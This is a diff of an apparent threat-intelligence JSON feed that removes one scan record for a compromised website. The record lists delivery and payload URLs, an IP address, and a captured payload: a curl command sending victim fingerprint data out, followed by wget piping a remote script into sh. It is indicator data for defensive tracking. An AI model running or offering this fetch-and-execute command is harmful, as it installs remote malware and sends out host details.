@@ -9140,33 +9140,5 @@
     ],
     "ReportId": "cmw93kaoj2igo0omlf6r87ldo",
     "ScannedAt": "2026-11-09T10:07:06.059000+00:00"
-  },
-  {
-    "UrlDomain": "ghanawebdirectory.com",
-    "DeliveryUrl": [
-      "script.google.com",
-      "script-six-tawny.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin",
-      "https://script-six-tawny.vercel.app/mac"
-    ],
-    "IP": [
-      "77.37.83.235"
-    ],
-    "Related": [
-      {
-        "Value": "https://silverrogpuia.pro/t.js?site=a8de13ea441327f83d3fd28514f91ea5",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "curl -sL -d \"id=4f7a58c8-8e19-4964-b255-4d277312ae80&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fghanawebdirectory[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-09T09%3A34%3A02.296Z&lastShellAt=2026-11-09T09%3A34%3A02.296Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin"
-    ],
-    "ReportId": "cmw92gdsu2i5y0omlbhso6vbf",
-    "ScannedAt": "2026-11-09T09:36:03.887000+00:00"
   }
 ]
